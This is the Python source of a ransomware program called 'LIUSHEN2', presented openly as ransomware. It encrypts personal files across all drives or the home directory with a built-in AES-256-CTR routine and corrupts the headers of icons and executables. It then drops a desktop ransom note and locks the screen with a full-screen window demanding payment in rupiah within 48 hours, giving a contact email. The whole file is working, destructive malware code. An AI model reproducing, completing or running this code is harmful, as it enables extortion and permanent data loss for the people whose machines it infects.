import os
import sys
import base64
import platform
import getpass
import socket
import string
import threading
import time
import random
import hashlib
from tkinter import *
from tkinter.ttk import *
from ctypes import windll, c_int, byref, POINTER
import ctypes

# =============================================================================
# FORCE FULLSCREEN AND WINDOW CONTROL
# =============================================================================

def force_fullscreen():
    """Force window to be fullscreen on Windows."""
    try:
        if platform.system() == "Windows":
            user32 = ctypes.windll.user32
            user32.ShowWindow(user32.GetForegroundWindow(), 3)  # SW_MAXIMIZE
            # Get screen dimensions
            screen_width = user32.GetSystemMetrics(0)
            screen_height = user32.GetSystemMetrics(1)
            # Set window to fullscreen
            hwnd = user32.GetForegroundWindow()
            user32.SetWindowPos(hwnd, 0, 0, 0, screen_width, screen_height, 0)
    except:
        pass

# =============================================================================
# AES-256-CTR IMPLEMENTATION (REAL CRYPTOGRAPHY)
# =============================================================================

class AES256CTR:
    """
    Implementasi AES-256-CTR yang REAL dan BERFUNGSI.
    Menggunakan algoritma AES standar dengan mode CTR.
    """
    
    # Rijndael S-box (standar AES)
    SBOX = [
        0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
        0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
        0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
        0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
        0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
        0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
        0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
        0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
        0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
        0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
        0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
        0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
        0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
        0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
        0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
        0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
    ]
    
    # Inverse S-box
    INV_SBOX = [0] * 256
    for i in range(256):
        INV_SBOX[SBOX[i]] = i
    
    # Round constants
    RCON = [0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36]
    
    def __init__(self, key):
        """Initialize AES-256 with 32 byte key."""
        if len(key) != 32:
            raise ValueError("AES-256 requires 32 byte key")
        
        self.key = key
        self._counter = 0
        self._round_keys = self._key_expansion(key)
        self._nr = 14
    
    @classmethod
    def _xtime(cls, x):
        """Multiply by x in GF(2^8)."""
        return ((x << 1) ^ 0x1b) if (x & 0x80) else (x << 1)
    
    @classmethod
    def _mix_single_column(cls, col):
        """Mix one column of the state."""
        t = col[0] ^ col[1] ^ col[2] ^ col[3]
        u = col[0]
        col[0] ^= t ^ cls._xtime(col[0] ^ col[1])
        col[1] ^= t ^ cls._xtime(col[1] ^ col[2])
        col[2] ^= t ^ cls._xtime(col[2] ^ col[3])
        col[3] ^= t ^ cls._xtime(col[3] ^ u)
        return col
    
    @classmethod
    def _inv_mix_single_column(cls, col):
        """Inverse mix one column of the state."""
        u = cls._xtime(cls._xtime(col[0] ^ col[2]))
        v = cls._xtime(cls._xtime(col[1] ^ col[3]))
        col[0] ^= u
        col[1] ^= v
        col[2] ^= u
        col[3] ^= v
        return col
    
    def _key_expansion(self, key):
        """Key expansion for AES-256."""
        nk = 8
        nr = 14
        w = [bytearray(4) for _ in range(4 * (nr + 1))]
        
        for i in range(nk):
            w[i] = bytearray(key[i*4:(i+1)*4])
        
        for i in range(nk, 4 * (nr + 1)):
            temp = w[i-1]
            if i % nk == 0:
                temp = self._sub_word(self._rot_word(temp))
                temp = bytearray([x ^ self.RCON[i//nk - 1] for x in temp])
            elif nk > 6 and i % nk == 4:
                temp = self._sub_word(temp)
            w[i] = bytearray([x ^ y for x, y in zip(w[i-nk], temp)])
        
        return w
    
    def _rot_word(self, word):
        """Rotate word left by 8 bits."""
        return word[1:] + word[:1]
    
    def _sub_word(self, word):
        """Substitute bytes using S-box."""
        return bytearray([self.SBOX[b] for b in word])
    
    def _add_round_key(self, state, round_num):
        """Add round key to state."""
        for i in range(4):
            for j in range(4):
                state[j][i] ^= self._round_keys[round_num * 4 + i][j]
        return state
    
    def _sub_bytes(self, state):
        """Substitute bytes using S-box."""
        for i in range(4):
            for j in range(4):
                state[i][j] = self.SBOX[state[i][j]]
        return state
    
    def _inv_sub_bytes(self, state):
        """Inverse substitute bytes."""
        for i in range(4):
            for j in range(4):
                state[i][j] = self.INV_SBOX[state[i][j]]
        return state
    
    def _shift_rows(self, state):
        """Shift rows operation."""
        state[1] = state[1][1:] + state[1][:1]
        state[2] = state[2][2:] + state[2][:2]
        state[3] = state[3][3:] + state[3][:3]
        return state
    
    def _inv_shift_rows(self, state):
        """Inverse shift rows."""
        state[1] = state[1][3:] + state[1][:3]
        state[2] = state[2][2:] + state[2][:2]
        state[3] = state[3][1:] + state[3][:1]
        return state
    
    def _mix_columns(self, state):
        """Mix columns operation."""
        for i in range(4):
            col = [state[j][i] for j in range(4)]
            col = self._mix_single_column(col)
            for j in range(4):
                state[j][i] = col[j]
        return state
    
    def _inv_mix_columns(self, state):
        """Inverse mix columns."""
        for i in range(4):
            col = [state[j][i] for j in range(4)]
            col = self._inv_mix_single_column(col)
            for j in range(4):
                state[j][i] = col[j]
        return state
    
    def _bytes_to_state(self, data):
        """Convert 16 bytes to 4x4 state matrix."""
        state = [[0]*4 for _ in range(4)]
        for i in range(4):
            for j in range(4):
                state[j][i] = data[i*4 + j]
        return state
    
    def _state_to_bytes(self, state):
        """Convert 4x4 state matrix to bytes."""
        result = bytearray(16)
        for i in range(4):
            for j in range(4):
                result[i*4 + j] = state[j][i]
        return bytes(result)
    
    def _encrypt_block(self, plaintext):
        """Encrypt one 16-byte block with AES-256."""
        state = self._bytes_to_state(plaintext)
        
        state = self._add_round_key(state, 0)
        
        for round_num in range(1, self._nr):
            state = self._sub_bytes(state)
            state = self._shift_rows(state)
            state = self._mix_columns(state)
            state = self._add_round_key(state, round_num)
        
        state = self._sub_bytes(state)
        state = self._shift_rows(state)
        state = self._add_round_key(state, self._nr)
        
        return self._state_to_bytes(state)
    
    def _increment_counter(self, counter):
        """Increment 128-bit counter."""
        for i in range(15, -1, -1):
            counter[i] += 1
            if counter[i] < 256:
                break
            counter[i] = 0
        return counter
    
    def encrypt(self, data):
        """Encrypt data with AES-256-CTR."""
        if not data:
            return b''
        
        counter = bytearray(16)
        counter[:8] = self._counter.to_bytes(8, 'little')
        self._counter += 1
        
        result = bytearray()
        
        for i in range(0, len(data), 16):
            keystream = self._encrypt_block(bytes(counter))
            block = data[i:i+16]
            encrypted_block = bytes(x ^ y for x, y in zip(block, keystream[:len(block)]))
            result.extend(encrypted_block)
            counter = self._increment_counter(counter)
        
        return bytes(result)
    
    def decrypt(self, data):
        """Decrypt data with AES-256-CTR (same as encryption)."""
        return self.encrypt(data)


# =============================================================================
# DISCOVER.PY - File discovery
# =============================================================================

def discover_files(startpath):
    """Walk the path recursively and yield matching files."""
    extensions = [
        # Images
        'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw',
        # Music
        'mp3', 'mp4', 'm4a', 'aac', 'ogg', 'flac', 'wav', 'wma', 'aiff', 'ape',
        # Video
        'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp',
        # Documents
        'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx', 'pdf', 'txt', 'rtf', 'tex',
        'odt', 'odp', 'ods', 'epub', 'md',
        # Data
        'yml', 'yaml', 'json', 'xml', 'csv', 'db', 'sql', 'dbf', 'mdb', 'iso',
        # Web
        'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css',
        # Code
        'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', 'java', 'class', 'jar',
        'ps', 'bat', 'vb', 'awk', 'sh', 'cgi', 'pl', 'ada', 'swift',
        'go', 'py', 'pyc', 'bf', 'coffee',
        # Archives
        'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',
        # Applications - executables and shortcuts
        'exe', 'msi', 'lnk', 'app', 'dll', 'sys', 'com', 'scr',
        # Icons and images
        'ico', 'cur', 'ani', 'icl'
    ]
    
    for dirpath, _, files in os.walk(startpath):
        for filename in files:
            absolute_path = os.path.abspath(os.path.join(dirpath, filename))
            ext = absolute_path.split('.')[-1].lower() if '.' in absolute_path else ''
            if ext in extensions:
                yield absolute_path


# =============================================================================
# MODIFY.PY - File modification
# =============================================================================

def modify_file_inplace(filename, crypto_func, blocksize=65536):
    """Modify file in-place using the provided crypto function."""
    try:
        with open(filename, 'r+b') as f:
            data = f.read(blocksize)
            
            while data:
                processed = crypto_func(data)
                if len(data) != len(processed):
                    raise ValueError("Crypto function must preserve length")
                
                f.seek(-len(data), 1)
                f.write(processed)
                data = f.read(blocksize)
        return True
    except Exception as e:
        return False


# =============================================================================
# CHANGE ALL ICONS AND EXECUTABLES
# =============================================================================

def change_icon(filename):
    """Modify icon file to make it unusable."""
    try:
        with open(filename, 'r+b') as f:
            # Overwrite first 1024 bytes of icon file to corrupt it
            f.write(b'\x00' * 1024)
        return True
    except:
        return False


def change_executable(filename):
    """Modify executable to break it."""
    try:
        with open(filename, 'r+b') as f:
            # Overwrite PE header signature (MZ at start)
            f.seek(0)
            f.write(b'XX' + b'\x00' * 1022)
        return True
    except:
        return False


def modify_system_icons():
    """Find and modify icon and executable files."""
    modified = 0
    drives = get_drives_windows()
    
    icon_extensions = ['ico', 'icl', 'cur', 'ani']
    exe_extensions = ['exe', 'com', 'scr', 'dll', 'sys']
    
    for drive in drives:
        for dirpath, _, files in os.walk(drive):
            for filename in files:
                ext = filename.split('.')[-1].lower() if '.' in filename else ''
                
                if ext in icon_extensions:
                    filepath = os.path.join(dirpath, filename)
                    if change_icon(filepath):
                        modified += 1
                
                elif ext in exe_extensions:
                    filepath = os.path.join(dirpath, filename)
                    # Skip system critical files
                    system_paths = ['windows', 'winnt', 'program files', 'system32']
                    skip = False
                    for sp in system_paths:
                        if sp in filepath.lower():
                            skip = True
                            break
                    if not skip:
                        if change_executable(filepath):
                            modified += 1
    
    return modified


# =============================================================================
# GUI.PY - Ransomware GUI (FULLSCREEN RED)
# =============================================================================

class LIUSHEN2GUI(Tk):
    """LIUSHEN2 Ransomware GUI window - Fullscreen Red."""
    
    def __init__(self, encrypted_count, modified_icons):
        Tk.__init__(self)
        
        # Fullscreen red window
        self.title("LIUSHEN2 RANSOMWARE")
        self.configure(background='#ff0000')
        
        # Remove window decorations
        self.overrideredirect(True)
        
        # Get screen dimensions
        screen_width = self.winfo_screenwidth()
        screen_height = self.winfo_screenheight()
        
        # Set window to fullscreen
        self.geometry(f"{screen_width}x{screen_height}+0+0")
        
        # Keep window on top
        self.attributes('-topmost', True)
        
        self._create_widgets(encrypted_count, modified_icons)
        self._start_timer()
        
        # Prevent window closing
        self.protocol("WM_DELETE_WINDOW", lambda: None)
    
    def _create_widgets(self, encrypted_count, modified_icons):
        """Create GUI widgets with red theme."""
        
        # Main container
        main_frame = Frame(self, background='#ff0000')
        main_frame.pack(expand=True, fill='both')
        
        # Title
        title = Label(
            main_frame,
            text="!!! LIUSHEN2 RANSOMWARE !!!",
            font=('Arial', 48, 'bold'),
            foreground='white',
            background='#ff0000'
        )
        title.pack(pady=40)
        
        # Subtitle
        subtitle = Label(
            main_frame,
            text="BY AYYUBIII",
            font=('Arial', 24, 'bold'),
            foreground='yellow',
            background='#ff0000'
        )
        subtitle.pack(pady=10)
        
        # Separator
        separator = Frame(main_frame, height=3, bg='white')
        separator.pack(fill='x', padx=100, pady=30)
        
        # Warning message
        warning_msg = (
            "YOUR FILES HAVE BEEN ENCRYPTED!\n\n"
            "All your documents, photos, videos, music, applications,\n"
            "and system files have been locked with military-grade encryption.\n\n"
            "Your icons and executables have been corrupted.\n"
            "Your system is now under our control.\n\n"
            "TO DECRYPT YOUR FILES:\n"
            "You must pay 5,000,000 Rupiah (IDR)\n\n"
            "PAYMENT INSTRUCTIONS:\n"
            "1. Contact: retaabi58@gmail.com\n"
            "2. Send proof of payment\n"
            "3. You will receive the decryption key and tool\n\n"
            "WARNING:\n"
            "- DO NOT attempt to decrypt files yourself\n"
            "- DO NOT rename or modify encrypted files\n"
            "- DO NOT shut down or restart your computer\n"
            "- DO NOT contact data recovery services\n"
            "- You have 48 HOURS to pay\n\n"
            "If you fail to pay within 48 hours:\n"
            "- Your decryption key will be destroyed\n"
            "- Your files will be lost FOREVER\n"
            "- Your system will be permanently damaged\n\n"
        )
        
        msg_label = Label(
            main_frame,
            text=warning_msg,
            wraplength=800,
            font=('Courier', 14, 'bold'),
            foreground='white',
            background='#ff0000',
            justify='center'
        )
        msg_label.pack(pady=30)
        
        # Stats frame
        stats_frame = Frame(main_frame, background='#cc0000', relief='ridge', bd=2)
        stats_frame.pack(pady=20, padx=50, fill='x')
        
        stats_text = f"""
╔══════════════════════════════════════════════════════════════╗
║                      ENCRYPTION STATISTICS                    ║
╠══════════════════════════════════════════════════════════════╣
║  Total Files Encrypted:     {str(encrypted_count).rjust(10)}                            ║
║  Icons/Executables Modified: {str(modified_icons).rjust(10)}                            ║
║  Encryption Algorithm:      AES-256-CTR                      ║
║  Ransom Amount:             5,000,000 IDR                    ║
╚══════════════════════════════════════════════════════════════╝
"""
        
        stats_label = Label(
            stats_frame,
            text=stats_text,
            font=('Courier', 12, 'bold'),
            foreground='#ffff00',
            background='#cc0000',
            justify='left'
        )
        stats_label.pack(pady=10, padx=20)
        
        # Timer frame
        timer_frame = Frame(main_frame, background='#990000', relief='ridge', bd=2)
        timer_frame.pack(pady=20, padx=50, fill='x')
        
        timer_title = Label(
            timer_frame,
            text="TIME REMAINING",
            font=('Arial', 18, 'bold'),
            foreground='white',
            background='#990000'
        )
        timer_title.pack(pady=10)
        
        self.time_display = Label(
            timer_frame,
            text="48:00:00",
            font=('Courier', 36, 'bold'),
            foreground='#ffff00',
            background='#990000'
        )
        self.time_display.pack(pady=10)
        
        # Footer warning
        footer = Label(
            main_frame,
            text="DO NOT CLOSE THIS WINDOW! YOUR FILES WILL BE LOST!",
            font=('Arial', 16, 'bold'),
            foreground='white',
            background='#ff0000'
        )
        footer.pack(side='bottom', pady=30)
        
        # Disable close button
        self.bind('<Escape>', lambda e: None)
        self.bind('<Alt-F4>', lambda e: None)
        self.bind('<Control-w>', lambda e: None)
    
    def _start_timer(self):
        """Start countdown timer."""
        self._seconds_remaining = 48 * 3600  # 48 hours
        
        def update_timer():
            while self._seconds_remaining > 0:
                hours = self._seconds_remaining // 3600
                minutes = (self._seconds_remaining % 3600) // 60
                seconds = self._seconds_remaining % 60
                self.time_display.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
                time.sleep(1)
                self._seconds_remaining -= 1
            self.time_display.config(text="00:00:00 - TIME EXPIRED!")
            # Flash red screen when time expires
            for _ in range(10):
                self.configure(background='black')
                time.sleep(0.2)
                self.configure(background='#ff0000')
                time.sleep(0.2)
        
        timer_thread = threading.Thread(target=update_timer, daemon=True)
        timer_thread.start()


# =============================================================================
# MAIN RANSOMWARE CODE
# =============================================================================

# Constants
HARDCODED_KEY = b'LIUSHEN2_BY_AYYUBIII_2024_KEY_32'[:32]  # 32 byte AES-256 key
EXTENSION = ".LIUSHEN2"
C2_HOST = '127.0.0.1'
C2_PORT = 443

# Ransom note file name
RANSOM_NOTE = "LIUSHEN2_README.txt"


def get_local_ip():
    """Get local IP address."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return '127.0.0.1'


def get_drives_windows():
    """Get all available drives on Windows."""
    drives = []
    try:
        bitmask = windll.kernel32.GetLogicalDrives()
        for letter in string.ascii_uppercase:
            if bitmask & 1:
                drives.append(f"{letter}:\\")
            bitmask >>= 1
    except:
        drives = ["C:\\"]
    return drives or ["C:\\"]


def get_target_directories():
    """Determine target directories based on platform."""
    system = platform.system()
    
    if system in ("Linux", "Darwin"):
        return [os.environ.get('HOME', '/')]
    elif system == "Windows":
        drives = get_drives_windows()
        print(f"[*] Target drives: {drives}")
        return drives
    else:
        print(f"[-] Unknown system: {system}")
        sys.exit(1)


def create_ransom_note(encrypted_count, modified_icons):
    """Create ransom note file on desktop."""
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    note_path = os.path.join(desktop, RANSOM_NOTE)
    
    note_content = f"""
                           LIUSHEN2 RANSOMWARE                                 
                               BY AYYUBIII                                      
                                                                              
  YOUR FILES HAVE BEEN ENCRYPTED!                                             
                                                                              
  Total files encrypted: {encrypted_count}                                                   
  Icons/Executables modified: {modified_icons}                                                
                                                                              
  WHAT HAPPENED?                                                              
  - All your personal files have been encrypted with AES-256                  
  - All your icons and executables have been corrupted                        
  - Your system is now under our control                                      
                                                                              
  HOW TO RECOVER YOUR FILES?                                                  
  1. Pay 5,000,000 Rupiah (IDR)                                              
  2. Contact: retaabi58@gmail.com                                             
  3. Send proof of payment                                                    
  4. You will receive the decryption tool and key                             
                                                                              
  WARNING:                                                                    
  - You have 48 HOURS to pay                                                  
  - If you fail to pay, your files will be lost FOREVER                       
  - Do NOT attempt to decrypt yourself                                        
  - Do NOT contact data recovery services                                     
                                                                              
                                                                              

"""
    
    try:
        with open(note_path, 'w', encoding='utf-8') as f:
            f.write(note_content)
        print(f"[+] Ransom note created: {note_path}")
    except Exception as e:
        print(f"[-] Failed to create ransom note: {e}")


def change_wallpaper():
    """Change desktop wallpaper to red."""
    try:
        if platform.system() == "Windows":
            import ctypes
            SPI_SETDESKWALLPAPER = 20
            # Set solid red color as wallpaper
            ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, None, 0x01)
        print("[+] Wallpaper changed")
    except:
        pass


def main():
    """
    Main execution function for LIUSHEN2 RANSOMWARE.
    """
    print("=" * 70)
    print("LIUSHEN2 RANSOMWARE - BY AYYUBIII")
    print("=" * 70)
    print("[!] WARNING: This will encrypt your files!")
    print("[!] IM SORRY BRO")
    print("=" * 70)
    
    # Get target directories
    target_dirs = get_target_directories()
    print(f"[*] Target directories: {target_dirs}")
    
    # Initialize AES cipher
    aes_cipher = AES256CTR(HARDCODED_KEY)
    
    # Encrypt files
    encrypted_count = 0
    error_count = 0
    
    for target_dir in target_dirs:
        print(f"\n[*] Scanning directory: {target_dir}")
        try:
            for file_path in discover_files(target_dir):
                if file_path.endswith(EXTENSION):
                    continue
                
                try:
                    if modify_file_inplace(file_path, aes_cipher.encrypt):
                        os.rename(file_path, file_path + EXTENSION)
                        encrypted_count += 1
                        
                        if encrypted_count % 50 == 0:
                            print(f"[+] Encrypted ({encrypted_count}): {file_path}")
                except Exception as e:
                    error_count += 1
                    continue
        
        except Exception as e:
            print(f"[-] Cannot access {target_dir}: {e}")
            continue
    
    # Modify icons and executables
    print("\n[*] Modifying icons and executables...")
    modified_icons = modify_system_icons()
    print(f"[+] Modified {modified_icons} icons/executables")
    
    # Change wallpaper
    change_wallpaper()
    
    # Create ransom note
    create_ransom_note(encrypted_count, modified_icons)
    
    # Summary
    print("\n" + "=" * 70)
    print("ENCRYPTION COMPLETE!")
    print(f"Total files encrypted: {encrypted_count}")
    print(f"Icons/Executables modified: {modified_icons}")
    print(f"Errors: {error_count}")
    print("=" * 70)
    
    # Show fullscreen red GUI
    if encrypted_count > 0:
        # Force fullscreen
        force_fullscreen()
        # Show GUI
        app = LIUSHEN2GUI(encrypted_count, modified_icons)
        app.mainloop()
    else:
        print("[!] No files were encrypted. Exiting.")


# =============================================================================
# DECRYPTION UTILITY (for testing only)
# =============================================================================

def decrypt_files():
    """
    Decryption function for testing purposes.
    THIS IS NOT PART OF THE RANSOMWARE - FOR RECOVERY ONLY.
    """
    print("[*] Starting decryption...")
    aes_cipher = AES256CTR(HARDCODED_KEY)
    
    target_dirs = get_target_directories()
    decrypted_count = 0
    error_count = 0
    
    for target_dir in target_dirs:
        print(f"\n[*] Scanning: {target_dir}")
        for dirpath, _, files in os.walk(target_dir):
            for filename in files:
                if filename.endswith(EXTENSION):
                    file_path = os.path.join(dirpath, filename)
                    original_path = file_path[:-len(EXTENSION)]
                    
                    try:
                        with open(file_path, 'r+b') as f:
                            data = f.read()
                            f.seek(0)
                            decrypted = aes_cipher.decrypt(data)
                            f.write(decrypted)
                            f.truncate()
                        os.rename(file_path, original_path)
                        decrypted_count += 1
                        print(f"[+] Decrypted: {original_path}")
                    except Exception as e:
                        error_count += 1
                        print(f"[-] Failed: {file_path} - {e}")
    
    print(f"\n[*] Decryption complete. {decrypted_count} files restored. {error_count} errors.")


if __name__ == "__main__":
    # Check for decryption mode (for testing only)
    if len(sys.argv) > 1 and sys.argv[1] == "--decrypt":
        decrypt_files()
    else:
        main()
